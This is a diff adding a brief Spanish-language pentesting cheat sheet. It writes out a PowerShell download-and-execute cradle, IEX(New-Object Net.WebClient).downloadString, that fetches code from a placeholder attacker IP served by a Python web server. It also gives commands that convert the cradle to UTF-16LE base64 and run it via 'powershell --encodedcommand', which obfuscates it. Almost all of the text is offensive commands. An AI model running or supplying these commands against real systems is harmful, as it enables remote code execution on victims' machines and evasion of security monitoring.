@@ -1,0 +1,15 @@
+
+
+### Descargar archivo de servidor web ('python3 -m http.server 80')
+		::: IEX(New-Object Net.WebClient).downloadString('http://miIpHere/fileHere')
+
+
+
+
+### Comandos encodeados base64 powershell
+						echo -n "IEX(New-Object Net.WebClient).downloadString('http://miIpHere/fileHere')" | xxd						
+						echo -n "IEX(New-Object Net.WebClient).downloadString('http://miIpHere/fileHere')" | iconv -t utf-16le | xxd					"los puntos son necesarios paWindows"
+
+	unix::: echo -n "IEX(New-Object Net.WebClient).downloadString('http://miIpHere/fileHere')" | iconv -t utf-16le | base64 -w 0; echo
+			 
+			win::: cmd /c powershell --encodedcommand hereBase64_iconv-t_utf-16le
